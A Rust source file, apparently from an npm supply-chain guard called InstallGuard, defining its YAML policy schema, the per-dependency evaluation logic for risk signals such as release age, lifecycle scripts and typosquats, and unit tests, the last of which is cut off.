//! Built-in policy DSL (Milestone 0 subset).
//!
//! Supports:
//! * `defaults.minimumReleaseAge` (minutes)
//! * `defaults.blockExoticSubdeps`
//! * `direct.minimumReleaseAge` (overrides for direct deps)
//! * `scripts.policy` + `scripts.allow`
//!
//! Other DSL keys defined in DESIGN.md §4 will be added in later milestones.

use chrono::{DateTime, Utc};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::decision::{Decision, Reason, Severity};
use crate::dependency::ResolvedDependency;
use crate::signal::SignalSet;

/// Per-evaluation context carried alongside `Policy` and the dependency
/// being scored. Lets the engine adjust verdicts based on facts that come
/// from the project, not the package (e.g. install-time `--ignore-scripts`).
#[derive(Debug, Clone, Copy, Default)]
pub struct EvalContext {
    /// True when the project installs with `--ignore-scripts` (CLI flag,
    /// `.npmrc`, etc.). Lifecycle scripts then emit
    /// [`Reason::LifecycleScriptIgnored`] instead of
    /// [`Reason::DisallowedLifecycleScript`].
    pub ignore_scripts: bool,
}

#[derive(Debug, thiserror::Error)]
pub enum PolicyError {
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    #[error("yaml: {0}")]
    Yaml(#[from] serde_yaml::Error),
    #[error("unsupported policyVersion {0}; this build supports 1")]
    UnsupportedVersion(u32),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "kebab-case")]
pub enum ScriptPolicy {
    DenyByDefault,
    AllowByDefault,
}

impl Default for ScriptPolicy {
    fn default() -> Self {
        Self::DenyByDefault
    }
}

#[derive(Debug, Default, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase", default, deny_unknown_fields)]
// This is a configuration container — every field here is independently
// toggleable by user policy, so a state-machine / enum refactor would
// fight the data model rather than serve it.
#[allow(clippy::struct_excessive_bools)]
pub struct Defaults {
    /// Minimum release age in minutes. `0` disables the check.
    pub minimum_release_age: Option<i64>,
    /// Block dependencies whose source is not a registry or workspace.
    #[serde(default)]
    pub block_exotic_subdeps: bool,
    /// Emit a [`Reason::PublisherChange`] when the resolved version was
    /// published by a different npm account than the immediately-prior
    /// version. Default severity is `block`; downgrade via the
    /// `severity` map (e.g. `publisher-change: warn`).
    #[serde(default)]
    pub detect_publisher_change: bool,
    /// Emit a [`Reason::DeprecatedVersion`] when the registry reports
    /// the resolved version as deprecated. Default severity is `block`;
    /// many projects will want `severity.deprecated-version: warn`
    /// during a clean-up rollout.
    #[serde(default)]
    pub flag_deprecated: bool,
    /// Emit a [`Reason::VersionSurfaceChange`] when the resolved
    /// version adds new `bin` entries or new lifecycle-script names
    /// compared to the immediately-prior released version. Off by
    /// default — legitimate releases regularly add CLIs — but
    /// extremely useful when scoped to direct deps via
    /// `direct.detectVersionSurfaceChange: true`.
    #[serde(default)]
    pub detect_version_surface_change: bool,
    /// Block versions whose publisher account is younger than this
    /// many days at the time of publication. `0` disables the check.
    /// Account-takeover attacks frequently use freshly-created burner
    /// accounts; a 30- to 60-day floor catches them without
    /// flagging legitimate new maintainers in steady-state projects.
    #[serde(default)]
    pub min_maintainer_account_age_days: u32,
    /// Require the dependency to carry verified npm provenance
    /// (a Sigstore DSSE bundle whose in-toto subject digest matches
    /// the tarball integrity). When `true`, missing or unverifiable
    /// provenance is reported as [`Reason::ProvenanceMissing`].
    /// Off by default — most of the npm ecosystem does not yet
    /// publish with `--provenance`, so global enforcement breaks
    /// builds. Recommended scope: `direct.requireProvenance: true`
    /// for first-party deps in regulated environments.
    #[serde(default)]
    pub require_provenance: bool,
    /// Minimum aggregate trust score in `[0, 100]` (see
    /// [`crate::trust_score`]). `0` disables the check. The
    /// score is computed from the full signal set after every
    /// other detector has run; it acts as a *cumulative* gate
    /// that catches dependencies whose individual signals each
    /// look acceptable but together cross a risk budget.
    #[serde(default)]
    pub min_trust_score: u8,
    /// Lowest advisory severity that should fire
    /// [`Reason::AdvisoryKnown`]. Advisories below this floor are
    /// recorded on the dependency for visibility but do not block.
    /// Defaults to [`AdvisorySeverity::None`] (off) so adopting
    /// the OSV provider is opt-in. Recommended starting point:
    /// `maxAdvisorySeverity: high`.
    #[serde(default)]
    pub max_advisory_severity: AdvisorySeverity,
    /// When `true`, dependencies whose project-metadata signal
    /// reports no declared license fire [`Reason::LicenseMissing`].
    /// Off by default — absence of catalogue data is common in the
    /// long tail of npm.
    #[serde(default)]
    pub require_license: bool,
    /// Optional allowlist of SPDX identifiers (case-insensitive,
    /// matched verbatim against the catalogue's report). Empty
    /// list disables the allowlist gate; non-empty enforces it
    /// strictly: any catalogue-reported license not on the list
    /// fires [`Reason::LicenseDisallowed`]. We deliberately do not
    /// parse SPDX expressions — operators who need expression
    /// matching can pre-normalise their allowlist.
    #[serde(default)]
    pub license_allowlist: Vec<String>,
    /// Allowlist of package names (exact match) that should never
    /// fire [`Reason::NameSquat`]. The detector flags any name
    /// within Levenshtein-1 of the popular-name list, which
    /// catches genuine typosquats but also produces false
    /// positives for legitimate packages whose names happen to
    /// sit close to a popular one (e.g. `gaxios` — Google's
    /// official HTTP client — against `axios`). Add the exact
    /// package name (no version) to suppress the finding.
    #[serde(default)]
    pub name_squat_allow: Vec<String>,
    /// When `true`, dependencies whose project-metadata signal
    /// reports the upstream project as archived fire
    /// [`Reason::ProjectArchived`]. Off by default; common in
    /// regulated environments.
    #[serde(default)]
    pub block_archived: bool,
    /// Minimum acceptable OpenSSF Scorecard score (0-10) for the
    /// upstream repository. `0` disables the gate entirely (the
    /// default), so the Scorecard provider is opt-in. The signal
    /// itself still flows through [`crate::trust_score`] when
    /// produced, regardless of whether the gate is armed.
    #[serde(default)]
    pub min_scorecard_score: u8,
}

/// Severity floor for the [`Reason::AdvisoryKnown`] gate.
///
/// Severities form a total order; setting the floor at `high`
/// means any advisory of `high` *or* `critical` fires the gate.
/// `none` disables the gate entirely — advisories are still
/// recorded as signals but are never promoted to reasons.
///
/// `unknown` is a separate sentinel for advisories whose source
/// did not record a severity. We treat it as below `low` so an
/// operator who sets the floor to `low` does NOT accidentally
/// block on every unrecorded-severity advisory.
#[derive(
    Debug, Clone, Copy, Default, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, JsonSchema,
)]
#[serde(rename_all = "lowercase")]
pub enum AdvisorySeverity {
    #[default]
    None,
    Unknown,
    Low,
    Medium,
    High,
    Critical,
}

impl AdvisorySeverity {
    /// Parses the lowercased severity string carried on a
    /// [`crate::signal::Signal::AdvisoryKnown`] signal. Anything
    /// that doesn't match a known bucket maps to
    /// [`AdvisorySeverity::Unknown`] — we never silently drop an
    /// advisory just because its source spelled the bucket weirdly.
    #[must_use]
    pub fn from_signal(s: &str) -> Self {
        match s {
            "low" => Self::Low,
            "medium" | "moderate" => Self::Medium,
            "high" => Self::High,
            "critical" => Self::Critical,
            _ => Self::Unknown,
        }
    }
}

#[derive(Debug, Default, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase", default, deny_unknown_fields)]
pub struct DirectOverrides {
    pub minimum_release_age: Option<i64>,
    /// Per-direct-dep override for [`Defaults::detect_publisher_change`].
    /// When `Some(_)`, takes precedence for direct deps.
    pub detect_publisher_change: Option<bool>,
    /// Per-direct-dep override for [`Defaults::flag_deprecated`].
    pub flag_deprecated: Option<bool>,
    /// Per-direct-dep override for
    /// [`Defaults::detect_version_surface_change`].
    pub detect_version_surface_change: Option<bool>,
    /// Per-direct-dep override for
    /// [`Defaults::min_maintainer_account_age_days`].
    pub min_maintainer_account_age_days: Option<u32>,
    /// Per-direct-dep override for [`Defaults::require_provenance`].
    pub require_provenance: Option<bool>,
    /// Per-direct-dep override for [`Defaults::min_trust_score`].
    pub min_trust_score: Option<u8>,
    /// Per-direct-dep override for [`Defaults::max_advisory_severity`].
    pub max_advisory_severity: Option<AdvisorySeverity>,
    /// Per-direct-dep override for [`Defaults::require_license`].
    pub require_license: Option<bool>,
    /// Per-direct-dep override for [`Defaults::license_allowlist`].
    /// `None` defers to defaults; `Some(vec![])` explicitly
    /// *disables* the allowlist for direct deps.
    pub license_allowlist: Option<Vec<String>>,
    /// Per-direct-dep override for [`Defaults::block_archived`].
    pub block_archived: Option<bool>,
    /// Per-direct-dep override for [`Defaults::min_scorecard_score`].
    pub min_scorecard_score: Option<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase", default, deny_unknown_fields)]
pub struct Scripts {
    pub policy: ScriptPolicy,
    #[serde(default)]
    pub allow: Vec<String>,
}

impl Default for Scripts {
    fn default() -> Self {
        Self {
            policy: ScriptPolicy::DenyByDefault,
            allow: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
#[schemars(
    title = "InstallGuard policy",
    description = "Policy DSL for InstallGuard. See DESIGN.md §4 for full semantics."
)]
pub struct Policy {
    pub policy_version: u32,
    #[serde(default)]
    pub defaults: Defaults,
    #[serde(default)]
    pub direct: DirectOverrides,
    #[serde(default)]
    pub scripts: Scripts,
    /// Per-reason severity overrides. Keys are kebab-case reason codes
    /// (e.g. `release-age-below-threshold`); values are `allow` (suppress),
    /// `warn`, or `block`. Reasons not listed keep their default severity
    /// (currently always `block`, preserving v1 semantics).
    #[serde(default)]
    pub severity: std::collections::BTreeMap<String, Severity>,
}

impl Default for Policy {
    fn default() -> Self {
        Self {
            policy_version: 1,
            defaults: Defaults::default(),
            direct: DirectOverrides::default(),
            scripts: Scripts::default(),
            severity: std::collections::BTreeMap::new(),
        }
    }
}

impl Policy {
    pub fn from_yaml(yaml: &str) -> Result<Self, PolicyError> {
        let p: Self = serde_yaml::from_str(yaml)?;
        if p.policy_version != 1 {
            return Err(PolicyError::UnsupportedVersion(p.policy_version));
        }
        Ok(p)
    }

    pub fn from_path(path: &std::path::Path) -> Result<Self, PolicyError> {
        let raw = std::fs::read_to_string(path)?;
        Self::from_yaml(&raw)
    }

    /// JSON Schema (draft-07) describing the policy file format.
    /// Used to generate `schemas/installguard-policy.schema.json` and to
    /// power editor completions for `installguard.yaml`.
    #[must_use]
    pub fn json_schema() -> serde_json::Value {
        let schema = schemars::schema_for!(Policy);
        serde_json::to_value(schema).expect("schema is JSON-serialisable")
    }

    /// Evaluate one dependency against this policy.
    ///
    /// `now` is injected so tests are deterministic.
    #[must_use]
    pub fn evaluate(
        &self,
        dep: &ResolvedDependency,
        signals: &SignalSet,
        now: DateTime<Utc>,
    ) -> Decision {
        self.evaluate_with(dep, signals, now, EvalContext::default())
    }

    /// Evaluate with explicit context. See [`EvalContext`].
    #[must_use]
    #[allow(clippy::too_many_lines)] // each detector adds a small,
                                     // independent block of pushed reasons; splitting just to satisfy
                                     // a line-count lint would obscure the linear "collect signals →
                                     // map to reasons → apply severity" pipeline.
    pub fn evaluate_with(
        &self,
        dep: &ResolvedDependency,
        signals: &SignalSet,
        now: DateTime<Utc>,
        ctx: EvalContext,
    ) -> Decision {
        let mut reasons: Vec<Reason> = Vec::new();

        // ── Workspace short-circuit ─────────────────────────────────────
        // A workspace member is first-party code: it lives in this
        // repository, you wrote it, and it is not fetched from a
        // registry at install time. There is nothing meaningful for
        // any of the registry-shaped detectors below to say about it,
        // and asking the npm registry for a private workspace name
        // produces a 404 that surfaces as a noisy `signal-unavailable`
        // block. Skip evaluation entirely.
        if matches!(dep.source, crate::dependency::Source::Workspace) {
            return Decision::Allow;
        }

        // ── Exotic source ───────────────────────────────────────────────
        if self.defaults.block_exotic_subdeps && dep.source.is_exotic() {
            reasons.push(Reason::ExoticSource {
                kind: source_kind(&dep.source).to_string(),
            });
        }

        // ── Release age ─────────────────────────────────────────────────
        let required = self.required_release_age_minutes(dep);
        if required > 0 {
            match signals.published_at() {
                Some(published) => {
                    let observed = (now - published).num_minutes();
                    if observed < required {
                        reasons.push(Reason::ReleaseAgeBelowThreshold {
                            observed_minutes: observed.max(0),
                            required_minutes: required,
                        });
                    }
                }
                None => reasons.push(Reason::PublishedAtUnknown),
            }
        }

        // ── Lifecycle scripts ───────────────────────────────────────────
        if let Some(scripts) = signals.lifecycle_scripts() {
            for script in scripts {
                if !self.script_allowed(&dep.name, script) {
                    if ctx.ignore_scripts {
                        reasons.push(Reason::LifecycleScriptIgnored {
                            script: script.clone(),
                        });
                    } else {
                        reasons.push(Reason::DisallowedLifecycleScript {
                            script: script.clone(),
                        });
                    }
                }
            }
        }

        // ── Publisher change ────────────────────────────────────────────
        if self.detect_publisher_change_for(dep) {
            if let Some((prev_v, prev, cur)) = signals.publisher_change() {
                reasons.push(Reason::PublisherChange {
                    previous_version: prev_v.to_string(),
                    previous: prev.to_string(),
                    current: cur.to_string(),
                });
            }
        }
        // ── Deprecation ───────────────────────────────────────────
        if self.flag_deprecated_for(dep) {
            if let Some(msg) = signals.deprecated() {
                reasons.push(Reason::DeprecatedVersion {
                    message: msg.map(str::to_string),
                });
            }
        }
        // ── Suspicious script bodies ────────────────────────────────────
        // Always-on: the signal is pure evidence (regex matched), so the
        // policy lever is the standard severity map. Default `block`,
        // demote with `severity.suspicious-script: warn` for rollout.
        for (script, pattern, excerpt) in signals.suspicious_scripts() {
            reasons.push(Reason::SuspiciousScript {
                script: script.to_string(),
                pattern: pattern.to_string(),
                excerpt: excerpt.to_string(),
            });
        } // ── Version surface change ──────────────────────────────────
        if self.detect_version_surface_change_for(dep) {
            if let Some((prev_v, bins, scripts)) = signals.version_surface_change() {
                if !bins.is_empty() || !scripts.is_empty() {
                    reasons.push(Reason::VersionSurfaceChange {
                        previous_version: prev_v.to_string(),
                        added_bins: bins.to_vec(),
                        added_scripts: scripts.to_vec(),
                    });
                }
            }
        }
        // ── Dist-tag anomaly ────────────────────────────────────────────
        // Always-on: "latest moved backwards" is structurally
        // unusual but rarely an attack on its own — it most
        // commonly indicates a maintainer running an LTS line as
        // `latest` while a newer major exists on a separate tag.
        // Default severity `warn`; promote with
        // `severity.dist-tag-anomaly: block` if your supply-chain
        // policy treats every backwards-moving tag as suspect.
        //
        // Suppression: if the resolved dependency is itself on the
        // version that `latest` points at, the anomaly does not
        // affect this install — the user already has what `latest`
        // advertises. Without this guard, packages like
        // `attr-accept@2.2.5` (latest=2.2.5, highest=3.0.0 on a
        // separate release line) flag every consumer who simply
        // followed the publisher's stated current release.
        if let Some((latest, highest)) = signals.dist_tag_anomaly() {
            if dep.version != latest {
                reasons.push(Reason::DistTagAnomaly {
                    latest_version: latest.to_string(),
                    highest_published: highest.to_string(),
                });
            }
        }
        // ── Name squat (typo / homoglyph) ───────────────────────────────
        // Always-on: a near-miss for a popular package is structural
        // evidence, not a user preference. Default severity `block`;
        // demote with `severity.name-squat: warn` for legitimate names
        // that happen to live close to the popular list, or suppress
        // a specific package via `defaults.nameSquatAllow: [name]`
        // (e.g. `gaxios` is Google's official HTTP client and not a
        // typosquat of `axios`, despite a Levenshtein distance of 1).
        if let Some((style, target)) = signals.name_squat() {
            if !self
                .defaults
                .name_squat_allow
                .iter()
                .any(|n| n == &dep.name)
            {
                reasons.push(Reason::NameSquat {
                    style: style.to_string(),
                    target: target.to_string(),
                });
            }
        }
        // ── Maintainer new account ──────────────────────────────────────
        // Threshold-based, opt-in. The provider only emits the signal
        // when it knows the age; the policy decides whether the age is
        // too young for the configured threshold. Threshold = 0 (the
        // default) disables the check entirely.
        let threshold_days = self.min_maintainer_account_age_days_for(dep);
        if threshold_days > 0 {
            if let Some((account, age_days)) = signals.maintainer_new_account() {
                if age_days < threshold_days {
                    reasons.push(Reason::MaintainerNewAccount {
                        account: account.to_string(),
                        age_days,
                        threshold_days,
                    });
                }
            }
        }
        // ── Provenance requirement ──────────────────────────────────
        // Opt-in: when the toggle is on, the *absence* of a
        // ProvenanceVerified signal is itself a reason. The signal
        // is positive evidence — emitted only when verification
        // succeeded — so this check is symmetric and correct.
        if self.require_provenance_for(dep) && signals.provenance_claimed().is_none() {
            reasons.push(Reason::ProvenanceMissing);
        }
        // ── Known security advisories ────────────────────────────
        // Every AdvisoryKnown signal at or above the configured
        // floor becomes its own Reason. We emit one Reason per
        // advisory so audit logs and VEX exports can carry the
        // exact identifier list, not just a count.
        let floor = self.max_advisory_severity_for(dep);
        if floor != AdvisorySeverity::None {
            for (id, severity, _summary, source) in signals.advisories() {
                if AdvisorySeverity::from_signal(severity) >= floor {
                    reasons.push(Reason::AdvisoryKnown {
                        id: id.to_string(),
                        severity: severity.to_string(),
                        source: source.to_string(),
                    });
                }
            }
        }
        // ── Project-metadata gates ───────────────────────────────
        // require_license: missing licenses[] fires LicenseMissing.
        // license_allowlist: any license not on the list fires
        // LicenseDisallowed (if the list is non-empty).
        // block_archived: archived=Some(true) fires ProjectArchived.
        // All three need a project_metadata signal to evaluate;
        // absence of the signal is silent (catalogue might be down).
        if let Some((licenses, archived, source)) = signals.project_metadata() {
            if self.require_license_for(dep) && licenses.is_empty() {
                reasons.push(Reason::LicenseMissing {
                    source: source.to_string(),
                });
            }
            let allowlist = self.license_allowlist_for(dep);
            if !allowlist.is_empty() && !licenses.is_empty() {
                let allow_lower: Vec<String> =
                    allowlist.iter().map(|s| s.to_ascii_lowercase()).collect();
                let disallowed: Vec<String> = licenses
                    .iter()
                    .filter(|l| !allow_lower.iter().any(|a| a == &l.to_ascii_lowercase()))
                    .cloned()
                    .collect();
                if !disallowed.is_empty() {
                    reasons.push(Reason::LicenseDisallowed {
                        licenses: disallowed,
                        source: source.to_string(),
                    });
                }
            }
            if self.block_archived_for(dep) && archived == Some(true) {
                reasons.push(Reason::ProjectArchived {
                    source: source.to_string(),
                });
            }
        }
        // ── Scorecard gate ───────────────────────────────────────
        // Only fires when both (a) policy floor is non-zero and
        // (b) a scorecard signal was actually produced. Catalogue
        // silence is not punished here; the broader trust score is
        // the place that absorbs uncertainty.
        let scorecard_floor = self.min_scorecard_score_for(dep);
        if scorecard_floor > 0 {
            if let Some((score, repo, source)) = signals.scorecard() {
                if score < scorecard_floor {
                    reasons.push(Reason::ScorecardBelowThreshold {
                        score,
                        threshold: scorecard_floor,
                        repo: repo.to_string(),
                        source: source.to_string(),
                    });
                }
            }
        }
        // ── Cumulative trust score ───────────────────────────────
        // Runs last so it sees every signal that the providers
        // produced. The score itself is logged on the dependency
        // record (see audit emitter) regardless of whether it
        // crosses the threshold; this branch only fires the Reason.
        let trust_threshold = self.min_trust_score_for(dep);
        if trust_threshold > 0 {
            let score = crate::trust_score::TrustScore::compute(signals);
            if score.value < trust_threshold {
                reasons.push(Reason::TrustScoreBelowThreshold {
                    score: score.value,
                    threshold: trust_threshold,
                });
            }
        }
        // ── Surface unavailability so it isn't silently swallowed ───────
        for sig in &signals.signals {
            if let crate::signal::Signal::Unavailable { provider, reason } = sig {
                reasons.push(Reason::SignalUnavailable {
                    provider: provider.clone(),
                    reason: reason.clone(),
                });
            }
        }

        // ── Apply severity overrides ────────────────────────────────────
        let mut warn_reasons: Vec<Reason> = Vec::new();
        let mut block_reasons: Vec<Reason> = Vec::new();
        for r in reasons {
            match self.severity_for(&r) {
                Severity::Allow => {} // suppressed
                Severity::Warn => warn_reasons.push(r),
                Severity::Block => block_reasons.push(r),
            }
        }

        if !block_reasons.is_empty() {
            // Surface warn reasons too — they're still useful diagnostics
            // even when something else fails the package.
            block_reasons.extend(warn_reasons);
            Decision::Block {
                reasons: block_reasons,
            }
        } else if !warn_reasons.is_empty() {
            Decision::Warn {
                reasons: warn_reasons,
            }
        } else {
            Decision::Allow
        }
    }

    /// Resolve the effective severity for a reason. Default is `Block`
    /// for everything except a small set of reasons that are noisy or
    /// non-attack-shaped by default and should not fail an install on
    /// their own:
    ///
    /// - [`Reason::LifecycleScriptIgnored`] — the script can't run
    ///   during install (a later `npm rebuild` would).
    /// - [`Reason::DistTagAnomaly`] — a backwards-moving `latest`
    ///   tag is most often a deliberate LTS-line policy rather than
    ///   an attack.
    /// - [`Reason::SignalUnavailable`] — the provider failed to
    ///   answer; absence of evidence is not evidence of compromise.
    ///   Operators who want strict-fail-closed semantics can promote
    ///   with `severity.signal-unavailable: block`.
    ///
    /// The policy's `severity` map overrides any default.
    fn severity_for(&self, r: &Reason) -> Severity {
        if let Some(s) = self.severity.get(r.code()).copied() {
            return s;
        }
        match r {
            Reason::LifecycleScriptIgnored { .. }
            | Reason::DistTagAnomaly { .. }
            | Reason::SignalUnavailable { .. } => Severity::Warn,
            _ => Severity::Block,
        }
    }

    fn required_release_age_minutes(&self, dep: &ResolvedDependency) -> i64 {
        if dep.direct {
            self.direct
                .minimum_release_age
                .or(self.defaults.minimum_release_age)
                .unwrap_or(0)
        } else {
            self.defaults.minimum_release_age.unwrap_or(0)
        }
    }

    fn detect_publisher_change_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .detect_publisher_change
                .unwrap_or(self.defaults.detect_publisher_change)
        } else {
            self.defaults.detect_publisher_change
        }
    }

    fn flag_deprecated_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .flag_deprecated
                .unwrap_or(self.defaults.flag_deprecated)
        } else {
            self.defaults.flag_deprecated
        }
    }

    fn detect_version_surface_change_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .detect_version_surface_change
                .unwrap_or(self.defaults.detect_version_surface_change)
        } else {
            self.defaults.detect_version_surface_change
        }
    }

    fn min_maintainer_account_age_days_for(&self, dep: &ResolvedDependency) -> u32 {
        if dep.direct {
            self.direct
                .min_maintainer_account_age_days
                .unwrap_or(self.defaults.min_maintainer_account_age_days)
        } else {
            self.defaults.min_maintainer_account_age_days
        }
    }

    fn require_provenance_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .require_provenance
                .unwrap_or(self.defaults.require_provenance)
        } else {
            self.defaults.require_provenance
        }
    }

    fn min_trust_score_for(&self, dep: &ResolvedDependency) -> u8 {
        if dep.direct {
            self.direct
                .min_trust_score
                .unwrap_or(self.defaults.min_trust_score)
        } else {
            self.defaults.min_trust_score
        }
    }

    fn max_advisory_severity_for(&self, dep: &ResolvedDependency) -> AdvisorySeverity {
        if dep.direct {
            self.direct
                .max_advisory_severity
                .unwrap_or(self.defaults.max_advisory_severity)
        } else {
            self.defaults.max_advisory_severity
        }
    }

    fn require_license_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .require_license
                .unwrap_or(self.defaults.require_license)
        } else {
            self.defaults.require_license
        }
    }

    fn license_allowlist_for<'a>(&'a self, dep: &ResolvedDependency) -> &'a [String] {
        if dep.direct {
            self.direct
                .license_allowlist
                .as_deref()
                .unwrap_or(&self.defaults.license_allowlist)
        } else {
            &self.defaults.license_allowlist
        }
    }

    fn block_archived_for(&self, dep: &ResolvedDependency) -> bool {
        if dep.direct {
            self.direct
                .block_archived
                .unwrap_or(self.defaults.block_archived)
        } else {
            self.defaults.block_archived
        }
    }

    fn min_scorecard_score_for(&self, dep: &ResolvedDependency) -> u8 {
        if dep.direct {
            self.direct
                .min_scorecard_score
                .unwrap_or(self.defaults.min_scorecard_score)
        } else {
            self.defaults.min_scorecard_score
        }
    }

    fn script_allowed(&self, package: &str, _script: &str) -> bool {
        match self.scripts.policy {
            ScriptPolicy::AllowByDefault => true,
            ScriptPolicy::DenyByDefault => {
                DEFAULT_SCRIPT_ALLOWLIST.binary_search(&package).is_ok()
                    || self.scripts.allow.iter().any(|p| p == package)
            }
        }
    }
}

/// Curated list of packages whose install-time lifecycle scripts
/// are documented and load-bearing — overwhelmingly native-binary
/// downloaders or workspace bootstrappers. These are the dominant
/// source of "everyone's CI is red" false positives under the
/// default DenyByDefault policy: the script genuinely needs to run
/// for the package to function, and the maintainer history /
/// install pattern is well known to the community.
///
/// Inclusion criteria (all four required):
///   * ≥ 1M weekly downloads on npm.
///   * Single, well-understood install / postinstall purpose
///     (native binary fetch, asset copy, native build) that the
///     package's README documents prominently.
///   * No historical takeover / supply-chain advisory tied to the
///     install script itself.
///   * Removing the script would render the package non-functional
///     (so users can't realistically vendor a "no-scripts" fork).
///
/// MUST stay sorted ASCII: looked up via `binary_search`. The
/// `default_script_allowlist_is_sorted_for_binary_search` test
/// enforces this. Per-package, not per-(package, script): if a
/// listed package adds a *new* lifecycle script, the
/// `VersionSurfaceChange` signal still fires and surfaces the
/// addition independently — this allowlist concerns only "this
/// package legitimately uses install scripts", not "trust any
/// future additions blindly".
const DEFAULT_SCRIPT_ALLOWLIST: &[&str] = &[
    "bcrypt",
    "cypress",
    "electron",
    "esbuild",
    "fsevents",
    "msw",
    "node-gyp",
    "node-pre-gyp",
    "playwright",
    "puppeteer",
    "sharp",
    "supabase",
];

fn source_kind(s: &crate::dependency::Source) -> &'static str {
    use crate::dependency::Source;
    match s {
        Source::Registry { .. } => "registry",
        Source::Git { .. } => "git",
        Source::Tarball { .. } => "tarball",
        Source::File { .. } => "file",
        Source::GithubShortcut { .. } => "github_shortcut",
        Source::Workspace => "workspace",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dependency::{Ecosystem, Source};
    use crate::signal::Signal;
    use chrono::Duration;

    fn dep(name: &str, direct: bool, source: Source) -> ResolvedDependency {
        ResolvedDependency {
            ecosystem: Ecosystem::Npm,
            name: name.into(),
            version: "1.0.0".into(),
            integrity: None,
            source,
            direct,
            requested_by: vec![],
        }
    }

    #[test]
    fn empty_policy_allows_everything() {
        let p = Policy::default();
        let d = p.evaluate(
            &dep(
                "axios",
                true,
                Source::Registry {
                    url: "https://registry.npmjs.org/".into(),
                },
            ),
            &SignalSet::default(),
            Utc::now(),
        );
        assert!(matches!(d, Decision::Allow));
    }

    #[test]
    fn release_age_blocks_when_too_fresh() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  minimumReleaseAge: 1440\n").unwrap();
        let now = Utc::now();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublishedAt {
            at: now - Duration::minutes(60),
        });
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            now,
        );
        assert!(d.is_block(), "expected block, got {d:?}");
    }

    #[test]
    fn release_age_allows_when_old_enough() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  minimumReleaseAge: 60\n").unwrap();
        let now = Utc::now();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublishedAt {
            at: now - Duration::hours(48),
        });
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            now,
        );
        assert!(matches!(d, Decision::Allow));
    }

    #[test]
    fn direct_overrides_apply_only_to_direct_deps() {
        let p = Policy::from_yaml(
            "policyVersion: 1\ndefaults:\n  minimumReleaseAge: 60\ndirect:\n  minimumReleaseAge: 4320\n",
        )
        .unwrap();
        let now = Utc::now();
        let mut signals = SignalSet::default();
        signals.push(Signal::PublishedAt {
            at: now - chrono::Duration::hours(2),
        });

        // Direct dep: 2h < 72h required ⇒ block.
        let d = p.evaluate(
            &dep("axios", true, Source::Registry { url: "x".into() }),
            &signals,
            now,
        );
        assert!(d.is_block());

        // Transitive dep: 2h > 1h required ⇒ allow.
        let d = p.evaluate(
            &dep("axios", false, Source::Registry { url: "x".into() }),
            &signals,
            now,
        );
        assert!(matches!(d, Decision::Allow));
    }

    #[test]
    fn exotic_source_blocked_when_enabled() {
        let p =
            Policy::from_yaml("policyVersion: 1\ndefaults:\n  blockExoticSubdeps: true\n").unwrap();
        let d = p.evaluate(
            &dep(
                "evil",
                false,
                Source::Git {
                    url: "https://x".into(),
                    reference: None,
                },
            ),
            &SignalSet::default(),
            Utc::now(),
        );
        assert!(d.is_block());
    }

    #[test]
    fn scripts_deny_by_default() {
        // Use a name not in DEFAULT_SCRIPT_ALLOWLIST so the test
        // genuinely exercises the user-supplied `scripts.allow`
        // path rather than falling through to the built-in default.
        let p = Policy::from_yaml(
            "policyVersion: 1\nscripts:\n  policy: deny-by-default\n  allow: [my-private-tool]\n",
        )
        .unwrap();
        let mut signals = SignalSet::default();
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });

        let blocked = p.evaluate(
            &dep("malware", true, Source::Registry { url: "x".into() }),
            &signals,
            Utc::now(),
        );
        assert!(blocked.is_block());

        let allowed = p.evaluate(
            &dep(
                "my-private-tool",
                true,
                Source::Registry { url: "x".into() },
            ),
            &signals,
            Utc::now(),
        );
        assert!(matches!(allowed, Decision::Allow));
    }

    /// Curated default allowlist covers the well-known native-binary
    /// downloaders without requiring users to write any policy YAML.
    /// Without this, a default `installguard scan` blocks every CI
    /// run that has esbuild / fsevents / msw in its lockfile, which
    /// in 2026 is virtually every JavaScript project on earth.
    #[test]
    fn default_script_allowlist_covers_native_binary_packages() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        for name in [
            "esbuild",
            "fsevents",
            "msw",
            "cypress",
            "playwright",
            "supabase",
        ] {
            let d = p.evaluate(
                &dep(name, false, Source::Registry { url: "x".into() }),
                &signals,
                Utc::now(),
            );
            assert!(
                matches!(d, Decision::Allow),
                "{name} should be allowed by default, got {d:?}"
            );
        }
    }

    /// The default allowlist must not silence un-vetted packages.
    #[test]
    fn default_script_allowlist_still_blocks_arbitrary_packages() {
        let p = Policy::default();
        let mut signals = SignalSet::default();
        signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        let d = p.evaluate(
            &dep(
                "definitely-not-vetted",
                false,
                Source::Registry { url: "x".into() },
            ),
            &signals,
            Utc::now(),
        );
        assert!(d.is_block(), "got {d:?}");
    }

    /// Sorted invariant required by `binary_search` in
    /// `script_allowed`. If you add a name, keep the slice sorted.
    #[test]
    fn default_script_allowlist_is_sorted_for_binary_search() {
